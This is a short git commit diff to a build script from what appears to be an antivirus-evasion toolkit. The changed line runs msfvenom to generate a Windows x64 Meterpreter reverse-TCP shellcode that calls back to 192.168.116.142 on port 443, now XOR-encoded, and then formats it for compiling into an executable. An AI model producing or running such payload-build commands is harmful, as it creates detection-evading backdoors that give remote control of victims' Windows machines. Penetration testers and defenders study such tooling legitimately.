523f55fa2f13058ef1fc0b7920a55da643956842
Daniel Sauder <daniel.sauder@web.de>
2017-04-02 17:03:05 +0200

    update

--- build/build_win64_meterpreter_rev_tcp_xor.sh
+++ build/build_win64_meterpreter_rev_tcp_xor.sh
@@ -2,7 +2,7 @@
 # example script for building executables with 64bit payload
 . build/global_win64.sh
 # make meterpreter reverse payload
-msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.116.132 lport=443 -f c --platform Windows > sc.txt
+msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.116.142 lport=443 -e x64/xor -f c --platform Windows > sc.txt
 # format the shellcode for make_avet
 ./format.sh sc.txt > scclean.txt && rm sc.txt
 # call make_avet, compile 
